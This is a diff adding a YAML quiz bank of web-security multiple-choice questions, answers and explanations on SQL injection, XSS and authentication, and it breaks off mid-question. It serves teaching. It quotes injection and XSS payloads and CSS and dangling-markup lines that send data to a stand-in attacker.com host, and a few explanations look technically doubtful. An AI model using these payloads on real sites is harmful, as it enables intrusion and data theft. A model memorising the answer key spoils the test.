@@ -1,0 +1,1535 @@
+# Web Security Academy — Quiz Bank
+# Genuinely challenging questions that test understanding, not memorization
+# Topics: 7 starter (12 questions each) + 5 secondary (6 questions each)
+
+questions:
+
+  # ============================================================
+  # SQL INJECTION (12 questions)
+  # ============================================================
+
+  - id: sqli-001
+    topic: sql-injection
+    type: scenario
+    difficulty: intermediate
+    question: "A WAF blocks single quotes in all input fields. The backend uses MySQL. Which technique is MOST likely to bypass the WAF and extract data?"
+    options:
+      - a: "Use double quotes instead — MySQL treats them identically to single quotes in string contexts"
+      - b: "Use hex encoding (0x61646D696E) to represent string values without quotes"
+      - c: "Use CHAR() function to construct strings character by character"
+      - d: "Use backslash escaping (\\') to pass the quote through the WAF"
+    answer: "b"
+    explanation: "Hex encoding (0x...) in MySQL represents string literals without any quote characters, completely bypassing the WAF. Option A is wrong because MySQL treats double quotes as identifier quotes (like backticks) by default, not string delimiters — unless ANSI_QUOTES mode is enabled. Option C could work but CHAR() still requires parentheses and commas which many WAFs also filter. Option D would likely still be caught since the quote character is present in the request."
+
+  - id: sqli-002
+    topic: sql-injection
+    type: tricky-concept
+    difficulty: advanced
+    question: "A developer uses parameterized queries everywhere but constructs ORDER BY clauses dynamically: `query = 'SELECT * FROM users ORDER BY ' + column_name`. Why can't this specific case use standard parameterized query placeholders?"
+    options:
+      - a: "Parameterized queries can handle ORDER BY — the developer simply used the wrong placeholder syntax"
+      - b: "Database engines don't allow parameters in ORDER BY positions because column names are identifiers, not literal values, and placeholders only bind data values"
+      - c: "ORDER BY clauses are evaluated before parameter binding occurs in the query execution pipeline"
+      - d: "Parameterized queries actually do work here, but only if you use positional (?) placeholders instead of named ones"
+    answer: "b"
+    explanation: "SQL parameter binding only works for data values (strings, numbers), not for identifiers like column names, table names, or SQL keywords. The database query planner needs to know the column at parse time to build an execution plan. Option A is wrong — no placeholder syntax supports identifiers. Option C inverts the execution order (parsing happens first, but parameters are still value-only). Option D is wrong because the limitation is fundamental to how prepared statements work, regardless of placeholder style."
+
+  - id: sqli-003
+    topic: sql-injection
+    type: scenario
+    difficulty: advanced
+    question: "You discover a second-order SQL injection: user registration stores a username unsanitized, and a profile page later uses that username in a query. The app uses parameterized queries for the INSERT during registration. What makes this exploitable?"
+    options:
+      - a: "Parameterized queries don't actually prevent malicious data from being stored — they only prevent it from being interpreted as SQL during the INSERT"
+      - b: "The parameterized query silently fails for INSERT statements, allowing the raw SQL to execute"
+      - c: "Second-order injection bypasses parameterized queries because the payload is base64-encoded in the database"
+      - d: "The INSERT query's parameterized binding is reversed when the data is read back from the database"
+    answer: "a"
+    explanation: "This is a critical misconception — parameterized queries prevent SQL injection at the point of query execution, but they don't sanitize the data itself. Malicious SQL syntax is safely stored as data. The vulnerability occurs when that stored data is later retrieved and concatenated into a different query without parameterization. Option B is wrong — parameterized queries work correctly for INSERTs. Option C fabricates a non-existent encoding behavior. Option D misunderstands how data storage works — the database stores the literal string."
+
+  - id: sqli-004
+    topic: sql-injection
+    type: defense-bypass
+    difficulty: advanced
+    question: "A WAF blocks all of these keywords: UNION, SELECT, FROM, OR, AND. The backend is MySQL. Which injection technique is MOST likely to still extract data?"
+    options:
+      - a: "Use stacked queries with a new INSERT to write query results to a table you can read via normal app functionality"
+      - b: "Use out-of-band extraction via LOAD_FILE() and INTO OUTFILE to exfiltrate data through DNS or file writes"
+      - c: "Use keyword fragmentation with inline comments: UN/**/ION SEL/**/ECT to bypass word-boundary matching"
+      - d: "Use time-based blind injection with BENCHMARK() or SLEEP() — neither keyword is blocked"
+    answer: "d"
+    explanation: "Time-based blind injection using SLEEP() or BENCHMARK() avoids all blocked keywords. You extract data bit by bit using IF() and character comparison with measurable time delays. Option A fails because MySQL doesn't support stacked queries through most common connectors (e.g., PHP's mysqli_query). Option B requires FILE privilege which is almost never granted to web app database users. Option C might work against naive WAFs but modern WAFs normalize comments before matching, so this is unreliable."
+
+  - id: sqli-005
+    topic: sql-injection
+    type: spot-the-vuln
+    difficulty: intermediate
+    question: "Consider this Python code:\n```python\ncursor.execute(f\"SELECT * FROM products WHERE category = '{category}' AND released = 1\")\n```\nThe developer argues this is safe because the AND clause ensures only released products show. What is the actual risk?"
+    options:
+      - a: "An attacker can comment out the AND clause using input like `' OR 1=1--`, seeing unreleased products and potentially all table data"
+      - b: "The f-string is safe because Python automatically escapes single quotes in formatted strings"
+      - c: "The AND clause is vulnerable but only to boolean-based blind injection since the output is filtered by the application layer"
+      - d: "The vulnerability exists but is limited to reading the products table since the query is a SELECT statement"
+    answer: "a"
+    explanation: "The SQL comment sequence (--) truncates everything after the injection point, completely removing the `AND released = 1` restriction. With `' OR 1=1--` the query becomes `SELECT * FROM products WHERE category = '' OR 1=1-- AND released = 1`, returning all rows. Option B is completely wrong — Python f-strings perform no escaping whatsoever. Option C understates the risk — the attacker gets direct output, not blind. Option D understates the risk — UNION injection can read any table, not just products."
+
+  - id: sqli-006
+    topic: sql-injection
+    type: tricky-concept
+    difficulty: advanced
+    question: "You're testing a PostgreSQL application and find injection in a WHERE clause. You try `'; DROP TABLE users--` but the table isn't dropped, even though the injection clearly works for data extraction. What is the MOST likely reason?"
+    options:
+      - a: "PostgreSQL doesn't support the DROP TABLE syntax used — it requires CASCADE"
+      - b: "The database connection uses a low-privilege role that has SELECT but not DROP permissions"
+      - c: "Most PostgreSQL client libraries (like libpq) do not support multiple statements in a single query call by default"
+      - d: "DROP TABLE is a DDL statement which PostgreSQL always runs in a separate implicit transaction that gets rolled back"
+    answer: "c"
+    explanation: "Unlike MySQL, PostgreSQL's standard query execution functions (PQexec is an exception, but most frameworks use PQexecParams) reject or ignore stacked queries. The semicolon simply causes a syntax error or is ignored. Option B is plausible but wouldn't be the 'most likely' reason — it would produce a permission error, not silent failure. Option A is wrong — CASCADE is optional. Option D fabricates a non-existent PostgreSQL behavior regarding implicit DDL transactions."
+
+  - id: sqli-007
+    topic: sql-injection
+    type: scenario
+    difficulty: advanced
+    question: "You've confirmed blind SQL injection in an Oracle database but SLEEP() and BENCHMARK() don't work. What is the correct Oracle-specific technique for time-based data extraction?"
+    options:
+      - a: "Use DBMS_PIPE.RECEIVE_MESSAGE('pipe', 10) to introduce a measurable delay"
+      - b: "Use UTL_HTTP.REQUEST() to make an outbound HTTP call that introduces network delay"
+      - c: "Use WAITFOR DELAY '0:0:10' which is Oracle's native delay function"
+      - d: "Use a heavy nested SELECT with XMLTYPE to cause computational delay proportional to data size"
+    answer: "a"
+    explanation: "DBMS_PIPE.RECEIVE_MESSAGE is Oracle's classic time-based injection primitive — it waits for a message on a named pipe for a specified number of seconds, reliably creating a measurable delay. Option B might work for out-of-band extraction but UTL_HTTP is often restricted by ACLs and doesn't provide precise timing control. Option C is wrong — WAITFOR DELAY is Microsoft SQL Server syntax, not Oracle. Option D is unreliable because computational delay varies with server load and doesn't produce consistent timing."
+
+  - id: sqli-008
+    topic: sql-injection
+    type: defense-bypass
+    difficulty: advanced
+    question: "A web app escapes all single quotes by doubling them (replacing ' with ''), which is the database vendor's recommended escaping for the quoting style used. In which scenario does this defense STILL fail?"
+    options:
+      - a: "When the injection point is inside a numeric context (e.g., WHERE id = $input) where quotes are never used"
+      - b: "When the attacker uses Unicode homoglyphs that look like single quotes but have different byte values"
+      - c: "When the database uses UTF-8 encoding, which represents single quotes as two bytes that can be split"
+      - d: "When the application calls the escape function twice, each round un-escaping the previous one"
+    answer: "a"
+    explanation: "If user input is placed in a numeric context without quotes, the quote-doubling defense is irrelevant — the attacker doesn't need quotes at all. Input like `1 OR 1=1` breaks out of the numeric context directly. Option B doesn't work because databases parse SQL at the byte level and Unicode homoglyphs are different characters entirely. Option C is wrong — the single quote is a single byte (0x27) in UTF-8. Option D is wrong — doubling the escape function would produce four quotes ('''' → not exploitable), which is still safe."
+
+  - id: sqli-009
+    topic: sql-injection
+    type: attack-chain
+    difficulty: advanced
+    question: "You've achieved UNION-based SQL injection on a MySQL target and can read arbitrary database contents. The application runs as a high-privilege database user. What is the MOST impactful next step?"
+    options:
+      - a: "Read the mysql.user table to extract password hashes, crack them, and access the database directly"
+      - b: "Use INTO OUTFILE to write a web shell to the web root, achieving server-side code execution"
+      - c: "Use LOAD_FILE() to read /etc/shadow and crack system passwords"
+      - d: "Enumerate all databases and tables to find sensitive data like credit cards or credentials"
+    answer: "b"
+    explanation: "Writing a web shell via INTO OUTFILE gives you OS-level command execution, which is the highest impact escalation from SQL injection. This requires FILE privilege (which a high-privilege user has) and knowing the web root path. Option A is lower impact — you already have database access via injection. Option C sounds devastating but /etc/shadow is typically not readable by the MySQL process user (it requires root). Option D is useful reconnaissance but doesn't escalate your access beyond what you already have."
+
+  - id: sqli-010
+    topic: sql-injection
+    type: tricky-concept
+    difficulty: intermediate
+    question: "What is the key difference between UNION-based injection returning `NULL,NULL,NULL` and using `'a','b','c'` when probing for column count?"
+    options:
+      - a: "NULL is type-compatible with every column data type, while string literals will cause type mismatch errors on non-string columns"
+      - b: "NULL values are invisible to WAFs while string literals trigger keyword detection rules"
+      - c: "Using NULL is faster because the database doesn't need to allocate memory for the return values"
+      - d: "There is no practical difference — both approaches produce identical results across all database engines"
+    answer: "a"
+    explanation: "NULL is implicitly compatible with any data type (integer, varchar, date, etc.), so UNION SELECT NULL,NULL,NULL will succeed regardless of the original query's column types. String literals like 'a' would cause errors if matched against INTEGER or DATE columns. Option B is wrong — WAFs generally don't treat NULL differently from other SQL keywords. Option C is technically negligible and irrelevant to why NULLs are preferred. Option D is wrong precisely because of the type mismatch issue."
+
+  - id: sqli-011
+    topic: sql-injection
+    type: scenario
+    difficulty: advanced
+    question: "You find SQL injection in an INSERT statement: `INSERT INTO logs (user, action) VALUES ('$user', 'login')`. Standard UNION-based extraction doesn't work. What is the MOST effective extraction technique?"
+    options:
+      - a: "Use a subquery in the injected value: `' || (SELECT password FROM users LIMIT 1) || '` to embed extracted data into the inserted row, then view it through normal application functionality"
+      - b: "UNION-based extraction works the same in INSERT contexts — you just need to match the column count of the target table"
+      - c: "Convert the INSERT to a SELECT using stacked queries: `'); SELECT password FROM users--`"
+      - d: "Use error-based extraction by injecting an invalid type conversion: `' || CAST((SELECT password FROM users LIMIT 1) AS INT)--` to leak data in the error message"
+    answer: "a"
+    explanation: "Subquery injection within the VALUES clause embeds the extracted data into the row being inserted. If you can later view the logs table through normal app functionality, the extracted data appears as the stored value. Option B is wrong — UNION SELECT requires a SELECT statement context, not INSERT. Option C requires stacked query support, which many DB connectors don't allow, and the SELECT result wouldn't be visible anyway. Option D can work but relies on verbose error messages being displayed, which is less reliable than using application functionality."
+
+  - id: sqli-012
+    topic: sql-injection
+    type: defense-bypass
+    difficulty: advanced
+    question: "An application uses a stored procedure for authentication: `CALL check_login(@user, @pass)`. A developer argues this is immune to SQL injection because stored procedures are precompiled. Under what condition is this STILL vulnerable?"
+    options:
+      - a: "If the stored procedure internally constructs dynamic SQL using string concatenation with the parameters: `EXECUTE('SELECT * FROM users WHERE name = ''' + @user + '''')`"
+      - b: "Stored procedures are always immune to SQL injection because the execution plan is compiled before user input is provided"
+      - c: "If the CALL statement itself is constructed via string concatenation rather than using parameterized placeholders for the procedure arguments"
+      - d: "Both A and C are correct — injection can occur at the procedure call or within the procedure body"
+    answer: "d"
+    explanation: "There are two distinct injection points. First, if the application builds the CALL statement with string concatenation instead of parameters, the procedure call itself is injectable. Second, even with a safely-called procedure, if the procedure's internal code uses dynamic SQL with string concatenation (EXECUTE/EXEC), the user input can be injected there. Option B is a dangerous myth — 'precompiled' refers to the execution plan, not input handling. The compilation happens with parameter placeholders, not with actual values baked in."
+
+  # ============================================================
+  # XSS (12 questions)
+  # ============================================================
+
+  - id: xss-001
+    topic: xss
+    type: defense-bypass
+    difficulty: advanced
+    question: "A site implements this CSP: `script-src 'self' https://cdn.jsdelivr.net`. How can an attacker achieve XSS despite this policy?"
+    options:
+      - a: "jsdelivr hosts user-contributed npm packages — an attacker can publish a malicious npm package and load it via the jsdelivr CDN"
+      - b: "The 'self' directive allows inline scripts as long as they don't use eval()"
+      - c: "CSP only blocks scripts in <script> tags — event handlers like onclick are unaffected by script-src"
+      - d: "The attacker can use a meta refresh tag to redirect to a javascript: URI which bypasses CSP"
+    answer: "a"
+    explanation: "jsdelivr serves any public npm package, so an attacker can publish a package containing malicious JavaScript and reference it from the whitelisted CDN origin. This is a classic CSP bypass via CDN abuse. Option B is wrong — 'self' does NOT allow inline scripts; that requires 'unsafe-inline'. Option C is wrong — CSP's script-src blocks inline event handlers too (they count as inline script). Option D is wrong — CSP blocks javascript: URIs, and meta refresh doesn't support javascript: URIs anyway."
+
+  - id: xss-002
+    topic: xss
+    type: tricky-concept
+    difficulty: advanced
+    question: "What is DOM clobbering and why is it dangerous even when a site has strict CSP with no 'unsafe-inline' or 'unsafe-eval'?"
+    options:
+      - a: "DOM clobbering uses HTML elements with id/name attributes to overwrite JavaScript global variables and DOM API references, manipulating existing trusted script logic without injecting new scripts"
+      - b: "DOM clobbering exploits the DOM parser to inject script elements that bypass CSP because they're created during HTML parsing, not JavaScript execution"
+      - c: "DOM clobbering overwrites the document.cookie property via a crafted DOM tree, allowing session theft through pure HTML injection"
+      - d: "DOM clobbering uses SVG foreignObject elements to create a separate DOM context where CSP doesn't apply"
+    answer: "a"
+    explanation: "DOM clobbering works by injecting HTML elements whose id or name attributes collide with global variables or DOM properties that existing JavaScript code references. For example, `<img id='x'><img name='x'>` creates a reference where `window.x` returns an HTMLCollection instead of the expected object. This can subvert the logic of already-trusted scripts. Option B is wrong — CSP blocks script elements regardless of how they're created. Option C is wrong — you can't overwrite document.cookie via DOM clobbering. Option D is wrong — SVG foreignObject doesn't create a CSP-exempt context."
+
+  - id: xss-003
+    topic: xss
+    type: scenario
+    difficulty: advanced
+    question: "A developer sanitizes XSS by removing all <script> tags using a regex. You need to achieve JavaScript execution. Which payload is MOST reliable?"
+    options:
+      - a: "`<img src=x onerror=alert(1)>` — uses an event handler which doesn't require script tags"
+      - b: "`<scr<script>ipt>alert(1)</scr</script>ipt>` — the regex removes the inner tags, reassembling valid script tags"
+      - c: "`<SCRIPT>alert(1)</SCRIPT>` — case sensitivity bypass since the regex only matches lowercase"
+      - d: "`<script/src=data:text/javascript,alert(1)>` — uses a self-closing script with a data URI"
+    answer: "a"
+    explanation: "Event handler attributes (onerror, onload, onmouseover, etc.) execute JavaScript without any script tags, completely bypassing tag-removal defenses. Option B is a well-known trick but unreliable — it depends on whether the regex runs once or recursively, and many implementations handle this. Option C might work but many regex implementations use case-insensitive flags, making this a gamble. Option D doesn't work because HTML parsers don't support self-closing script tags — the parser will keep reading looking for </script>."
+
+  - id: xss-004
+    topic: xss
+    type: tricky-concept
+    difficulty: advanced
+    question: "What is mutation XSS (mXSS) and why does it bypass DOMPurify-style sanitizers in some cases?"
+    options:
+      - a: "mXSS occurs when the browser's HTML parser reinterprets sanitized HTML differently during innerHTML assignment, creating executable markup that didn't exist in the sanitized string"
+      - b: "mXSS uses JavaScript prototype pollution to modify the sanitizer's internal allowlist, causing it to permit script elements"
+      - c: "mXSS exploits race conditions between the sanitizer running and the DOM rendering, injecting scripts in the gap"
+      - d: "mXSS leverages CSS @import rules to load external stylesheets containing JavaScript expressions"
+    answer: "a"
+    explanation: "Mutation XSS exploits differences between how a sanitizer parses HTML and how the browser's actual parser interprets the same string. For example, a sanitizer might see `<math><mi><table><mglyph><style><!--</style><img src=x onerror=alert(1)>` as safe, but the browser's parser mutates the DOM tree during parsing, moving elements out of their expected context and activating the payload. Option B describes a different attack entirely (prototype pollution). Option C is wrong — there is no timing gap in synchronous innerHTML assignment. Option D is wrong — CSS expressions were removed from modern browsers years ago."
+
+  - id: xss-005
+    topic: xss
+    type: spot-the-vuln
+    difficulty: intermediate
+    question: "Consider this code:\n```javascript\nlet url = new URL(location.href);\nlet name = url.searchParams.get('name');\ndocument.getElementById('greeting').innerHTML = `Welcome, ${name}!`;\n```\nWhich vulnerability class does this represent?"
+    options:
+      - a: "Reflected XSS — the server reflects the name parameter in the response without encoding"
+      - b: "DOM-based XSS — the payload flows from a source (URL parameter) to a sink (innerHTML) entirely in client-side JavaScript"
+      - c: "Stored XSS — the name value is stored in the URL which persists when shared"
+      - d: "Open redirect — the URL object can be manipulated to change the page destination"
+    answer: "b"
+    explanation: "This is textbook DOM-based XSS: the source is `url.searchParams.get('name')` (attacker-controlled input from the URL) and the sink is `innerHTML` (dangerous DOM API that parses HTML). The server never sees or processes the payload. Option A is wrong because the server is not involved — this is pure client-side JavaScript. Option C is wrong — the URL is not 'stored' in any persistent server-side sense; it's a transient link. Option D is wrong — no navigation or redirect occurs in this code."
+
+  - id: xss-006
+    topic: xss
+    type: defense-bypass
+    difficulty: advanced
+    question: "A site's CSP includes `script-src 'self' 'nonce-abc123'` and the nonce value changes on every page load. Assuming you have HTML injection but NOT access to the server response before the victim sees it, which attack is MOST feasible?"
+    options:
+      - a: "Use CSS injection to exfiltrate the nonce via attribute selectors: `input[nonce^='a'] { background: url(attacker.com/a) }` applied character by character"
+      - b: "Use dangling markup injection to capture the nonce: inject `<img src='https://attacker.com/?` which leaves an unclosed attribute that consumes subsequent HTML including the nonce"
+      - c: "Use a base tag injection (`<base href='https://attacker.com/'>`) to redirect all relative script URLs to your server"
+      - d: "Use meta http-equiv to override the CSP header with a more permissive policy"
+    answer: "c"
+    explanation: "Injecting `<base href='https://attacker.com/'>` redirects all relative URL script references to load from the attacker's server. If existing scripts use relative paths (`<script src='/js/app.js'>`), they'll load from the attacker's domain instead. Option A won't work because the nonce attribute is consumed during CSP processing and isn't directly accessible as a CSS-selectable DOM attribute in the same way. Option B is creative but modern browsers limit how far dangling markup can consume, and nonces are typically not adjacent in the HTML. Option D is wrong — meta http-equiv can only add CSP restrictions, not relax a header-set CSP."
+
+  - id: xss-007
+    topic: xss
+    type: scenario
+    difficulty: advanced
+    question: "You find an injection point inside an SVG file that's served with `Content-Type: image/svg+xml`. The page embeds it with `<img src='user-upload.svg'>`. Can you achieve JavaScript execution in the parent page's context?"
+    options:
+      - a: "Yes — SVG supports <script> tags and <foreignObject> with embedded HTML, so any JavaScript in the SVG runs in the parent page's context"
+      - b: "No — when SVGs are loaded via <img> tags, the browser sandboxes them: scripts don't execute and they have no access to the parent document"
+      - c: "Yes — SVG event handlers (onload, onclick) execute in the parent page's context even through <img> embedding"
+      - d: "It depends entirely on the CSP — if script-src allows 'self', SVG scripts from the same origin will execute"
+    answer: "b"
+    explanation: "Browsers deliberately sandbox SVGs loaded via <img> tags — JavaScript is completely disabled, no external resources load, and there's no access to the parent DOM. This is a key security boundary. For SVG XSS to work, the SVG must be loaded via <embed>, <object>, <iframe>, or navigated to directly. Option A describes what SVGs CAN do, but only outside the <img> sandbox. Option C is wrong for the same reason — event handlers are stripped in <img> context. Option D is wrong — CSP is irrelevant because the browser blocks SVG scripts in <img> context before CSP is even consulted."
+
+  - id: xss-008
+    topic: xss
+    type: tricky-concept
+    difficulty: intermediate
+    question: "A developer HTML-encodes user output using `&lt;`, `&gt;`, `&amp;`, `&quot;`. Their page has: `<a href=\"USER_INPUT\">Click</a>`. Is this safe?"
+    options:
+      - a: "Yes — HTML encoding prevents any form of XSS in attribute contexts"
+      - b: "No — the attacker can use a `javascript:alert(1)` URI which contains no characters that would be HTML-encoded"
+      - c: "No — the attacker can break out of the href attribute using URL-encoded quotes (%22) to inject event handlers"
+      - d: "Yes — the double quotes around the attribute prevent breakout, and HTML encoding handles the rest"
+    answer: "b"
+    explanation: "The string `javascript:alert(1)` contains no angle brackets, ampersands, or quotes, so HTML encoding doesn't modify it at all. When placed in an href attribute, clicking the link executes the JavaScript. This is why URL-context outputs require URL scheme validation (allowlisting http/https), not just HTML encoding. Option A is wrong — HTML encoding prevents attribute breakout but not dangerous URL schemes. Option C is wrong — URL-encoded quotes (%22) are decoded as literal characters in the URL value, not as HTML attribute delimiters. Option D correctly identifies that breakout is prevented, but misses the javascript: URI vector."
+
+  - id: xss-009
+    topic: xss
+    type: defense-bypass
+    difficulty: advanced
+    question: "A site uses DOMPurify to sanitize user HTML and then inserts it with innerHTML. The CSP is `default-src 'self'; style-src 'unsafe-inline'`. What attack is still possible?"
+    options:
+      - a: "CSS injection via style attributes to exfiltrate page data — DOMPurify allows style attributes by default, and CSP permits inline styles"
+      - b: "Script execution via mXSS — DOMPurify always has mutation XSS vulnerabilities in its latest version"
+      - c: "Injecting an iframe pointing to an attacker-controlled site to perform clickjacking from within the sanitized content"
+      - d: "Using meta refresh to redirect the page to a data: URI containing JavaScript"
+    answer: "a"
+    explanation: "DOMPurify's default configuration allows style attributes, and the CSP explicitly allows 'unsafe-inline' for styles. An attacker can exfiltrate sensitive data (CSRF tokens, page content) using CSS attribute selectors with background-image URLs: `input[value^='a']{background:url(https://attacker.com/a)}`. Option B is wrong — while mXSS bugs have existed, claiming current DOMPurify is always vulnerable is false. Option C won't work because default-src 'self' blocks iframes from other origins (frame-src falls back to default-src). Option D won't work because DOMPurify strips meta tags with http-equiv attributes."
+
+  - id: xss-010
+    topic: xss
+    type: scenario
+    difficulty: intermediate
+    question: "You find a reflected injection point inside a JavaScript string: `var search = 'USER_INPUT';`. Single quotes are escaped to `\\'`. How can you break out?"
+    options:
+      - a: "Use `</script><script>alert(1)//` to close the script block entirely — the HTML parser takes precedence over JavaScript string escaping"
+      - b: "Use double quotes instead — JavaScript treats single and double quotes identically so you can break the string with a double quote"
+      - c: "Use template literal backticks to break the string context since they aren't being escaped"
+      - d: "Use Unicode escapes (\\u0027) to inject a quote that bypasses the escaping function"
+    answer: "a"
+    explanation: "The HTML parser runs before the JavaScript parser. When it encounters `</script>`, it closes the script block regardless of JavaScript string context. The escaped quote defense only works within the JavaScript layer. Option B is wrong — you can't close a single-quoted string with a double quote in JavaScript; they're distinct delimiters. Option C is wrong — backticks start template literals, but they wouldn't close an already-opened single-quoted string. Option D is wrong — \\u0027 is only interpreted as a quote in JavaScript identifiers, not inside string literals where it remains a literal Unicode escape sequence."
+
+  - id: xss-011
+    topic: xss
+    type: tricky-concept
+    difficulty: advanced
+    question: "What is the practical difference between `document.createElement('script').src = url` and `element.innerHTML = '<script src=\"'+url+'\"></script>'` in terms of XSS defense?"
+    options:
+      - a: "They are equivalent — both create script elements that load and execute external JavaScript"
+      - b: "The innerHTML approach won't execute the script — browsers don't execute scripts inserted via innerHTML, while createElement works"
+      - c: "The createElement approach is safer because it avoids HTML parsing, while innerHTML parses the HTML context and can be exploited"
+      - d: "The innerHTML approach is safer because CSP applies to dynamically created elements but not to innerHTML-injected ones"
+    answer: "b"
+    explanation: "Per the HTML specification, <script> elements inserted via innerHTML are deliberately not executed by the browser. This is a specific security measure. The createElement approach creates a live script element that WILL execute when appended to the DOM. Option A is wrong because of this critical behavioral difference. Option C has the right intuition about createElement avoiding HTML parsing, but gets the safety conclusion backwards — the innerHTML version is actually 'safer' in this specific case since the script won't execute. Option D inverts reality — CSP applies uniformly."
+
+  - id: xss-012
+    topic: xss
+    type: attack-chain
+    difficulty: advanced
+    question: "You've achieved stored XSS in a subdomain (blog.example.com). The main app at www.example.com sets authentication cookies with `Domain=.example.com`. What is the MOST impactful escalation?"
+    options:
+      - a: "Read the main app's authentication cookies directly from the subdomain XSS since the cookie domain covers both"
+      - b: "Use the XSS to set a new cookie for .example.com with a forged session value, performing a session fixation attack on the main app"
+      - c: "Make fetch() requests from the subdomain XSS directly to www.example.com API endpoints — the cookies will be sent automatically"
+      - d: "Redirect users to a phishing page that mimics the main app login since they're already on a trusted domain"
+    answer: "c"
+    explanation: "Since cookies are set with `Domain=.example.com`, they're sent to ALL subdomains including blog.example.com. From the XSS context on the subdomain, you can use fetch() with `credentials: 'include'` to make authenticated requests to www.example.com's API, performing actions as the victim. Option A is partially right — you can read cookies IF they lack HttpOnly flag, but most auth cookies are HttpOnly. Option B is possible but lower impact — session fixation requires the victim to authenticate after the cookie is set. Option D is social engineering, not a technical escalation of the XSS."
+
+  # ============================================================
+  # AUTHENTICATION (12 questions)
+  # ============================================================
+
+  - id: auth-001
+    topic: authentication
+    type: tricky-concept
+    difficulty: advanced
+    question: "A developer stores passwords using bcrypt with cost factor 12. A security auditor notices that user passwords are not truncated before hashing. Why might this be a finding?"
+    options:
+      - a: "Without pre-truncation, extremely long passwords cause bcrypt to be computationally slower, enabling a denial-of-service via long password submissions"
+      - b: "bcrypt silently truncates input to 72 bytes — users who think they have a 100-character password actually only have 72 bytes of entropy protected"
+      - c: "Long passwords overflow bcrypt's internal buffer, causing a heap corruption vulnerability in older implementations"
+      - d: "Passwords longer than 72 characters cause bcrypt to fall back to a weaker hashing algorithm without the cost factor"
+    answer: "b"
+    explanation: "bcrypt has a hard limit of 72 bytes of input. Anything beyond that is silently ignored. A user with a 100-character passphrase doesn't benefit from those extra characters — and worse, two different passwords that share the first 72 bytes would produce the same hash. Option A has it backwards — bcrypt's cost is fixed regardless of input length. Option C fabricates a buffer overflow that doesn't exist in proper implementations. Option D is wrong — bcrypt doesn't fall back to another algorithm."
+
+  - id: auth-002
+    topic: authentication
+    type: scenario
+    difficulty: advanced
+    question: "A JWT-based API validates tokens using RS256. An attacker obtains the server's RSA public key (published at /.well-known/jwks.json). Which attack is MOST viable?"
+    options:
+      - a: "Forge tokens by changing the algorithm header to HS256 and signing with the public key as the HMAC secret — vulnerable libraries will use the public key for symmetric verification"
+      - b: "Use the public key to decrypt existing tokens, modify the claims, re-encrypt them, and send them back"
+      - c: "Factor the RSA public key to recover the private key using modern computing resources"
+      - d: "Set the algorithm header to 'none' and remove the signature entirely — the server will skip verification"
+    answer: "a"
+    explanation: "The algorithm confusion attack works because some JWT libraries use the algorithm specified in the token header rather than a server-side configuration. By switching to HS256, the library uses the RSA public key (which the attacker has) as the HMAC symmetric secret. Option B misunderstands JWT — tokens are signed, not encrypted (JWE is different from JWS). Option C is computationally infeasible for properly-sized RSA keys (2048+ bits). Option D (the 'none' algorithm attack) is a real vulnerability class but most modern JWT libraries have patched this, making it less likely to work than the algorithm confusion attack."
+
+  - id: auth-003
+    topic: authentication
+    type: defense-bypass
+    difficulty: advanced
+    question: "A site's password reset flow sends a 6-digit numeric code via email, valid for 10 minutes. Rate limiting blocks the IP after 5 wrong attempts. Which bypass is MOST likely to succeed?"
+    options:
+      - a: "Rotate through different IP addresses using a proxy pool to get 5 attempts per IP, brute-forcing the full code space"
+      - b: "Exploit a race condition by sending hundreds of concurrent requests before the rate limiter's counter increments — many will slip through"
+      - c: "Request multiple reset codes for the same account, then try each code in sequence since the rate limit tracks codes, not attempts"
+      - d: "Use the X-Forwarded-For header with different IPs to bypass IP-based rate limiting if the server trusts this header"
+    answer: "d"
+    explanation: "Many applications sit behind a reverse proxy and trust the X-Forwarded-For header for client identification. If the rate limiter uses this header value instead of the actual connection IP, an attacker can set arbitrary IPs to get unlimited attempts. Option A could work but requires expensive infrastructure and is slower. Option B is plausible for some implementations, but properly-implemented rate limiters use atomic counters that handle concurrency. Option C is wrong — requesting new codes typically invalidates previous ones, and the rate limit usually tracks attempts per account, not per code."
+
+  - id: auth-004
+    topic: authentication
+    type: tricky-concept
+    difficulty: advanced
+    question: "A login form takes 350ms for valid usernames with wrong passwords and 340ms for invalid usernames. The developer argues this 10ms difference is too small to exploit. Why are they wrong?"
+    options:
+      - a: "An attacker can amplify the timing difference by sending the password field as an extremely large value — bcrypt will take much longer only when it's actually called for valid users"
+      - b: "Statistical analysis over many requests can reliably distinguish even nanosecond differences — the 10ms gap is actually enormous by timing attack standards"
+      - c: "The attacker can use network timing amplification by routing requests through multiple proxy hops to multiply the delay"
+      - d: "The 10ms difference only needs to be distinguishable in aggregate — but the real issue is that the response changes with server load, making it unreliable"
+    answer: "b"
+    explanation: "With statistical methods (averaging hundreds of requests, filtering outliers), even microsecond differences become reliably detectable. A 10ms difference is actually quite large for timing attacks. Research has demonstrated remote timing attacks over the internet with sub-millisecond precision. Option A describes a real amplification technique but isn't the reason the developer is wrong about the gap being 'too small.' Option C is wrong — adding proxy hops adds noise, not signal; it would make timing attacks harder, not easier. Option D contradicts itself — server load variation is real but doesn't make the attack impossible, just requiring more samples."
+
+  - id: auth-005
+    topic: authentication
+    type: scenario
+    difficulty: advanced
+    question: "An OAuth 2.0 implementation uses the authorization code flow. The redirect_uri validation checks that the URI starts with the registered callback URL. An attacker controls a subdirectory on the same domain. Which attack is possible?"
+    options:
+      - a: "Register a path under the legitimate redirect URI (e.g., `https://app.com/callback/../../attacker-page`) using path traversal to redirect the auth code to an attacker-controlled page"
+      - b: "Use an open redirect on the legitimate callback page to chain-redirect the authorization code to an attacker's server via a fragment or query parameter"
+      - c: "Append an attacker-controlled path after the registered URI (e.g., `https://app.com/callback/attacker-controlled`) — the prefix check passes and the auth code is sent to a page the attacker controls"
+      - d: "Use a homograph domain that visually matches the registered redirect URI to fool the authorization server's comparison"
+    answer: "c"
+    explanation: "If the redirect_uri validation only checks that the URI starts with the registered value, the attacker can append anything after it. With control of a subdirectory (e.g., via an uploaded HTML file or a path they control), they can receive the authorization code at `https://app.com/callback/their-page`. Option A won't work because path traversal in URLs is normalized by the browser before sending, and the auth server would see the resolved path. Option B describes a real attack vector but requires an open redirect on the callback endpoint specifically, which is a different vulnerability. Option D would be caught by exact string comparison of the domain."
+
+  - id: auth-006
+    topic: authentication
+    type: defense-bypass
+    difficulty: advanced
+    question: "A site implements 2FA using TOTP. After entering username/password, the user is redirected to /2fa-verify. An attacker has stolen a user's password but not their TOTP secret. Which bypass is MOST likely?"
+    options:
+      - a: "Intercept and replay a valid TOTP code within its 30-second window from a previous session the attacker observed"
+      - b: "After passing the password step, directly access authenticated endpoints without completing the 2FA step — if the server tracks authentication state per-step rather than requiring both steps to complete"
